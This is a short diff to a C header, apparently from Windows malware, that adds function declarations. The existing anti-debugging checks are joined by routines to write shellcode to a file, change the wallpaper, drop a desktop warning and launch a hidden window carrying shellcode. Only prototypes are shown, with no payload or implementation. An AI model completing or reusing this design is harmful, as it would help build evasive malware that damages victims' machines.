@@ -65,3 +65,15 @@ BOOL CheckUsingExceptions();
 BOOL CheckIsDebuggerPresent();
 
 BOOL CheckRemoteDebugger();
+
+BOOL WriteShellcodeToFile(const BYTE* shellcode, DWORD shellcodeSize, const char* filePath);
+
+BOOL SetWallpaper(LPCWSTR wallpaperPath);
+
+BOOL GetDynamicPath(wchar_t* pathBuffer, size_t bufferSize);
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+
+VOID WriteWarningToDesktop();
+
+BOOL InitializePhantomWindow(HINSTANCE hInstance, int nCmdShow, const BYTE* shellcode, DWORD shellcodeSize, WNDPROC windowProc);
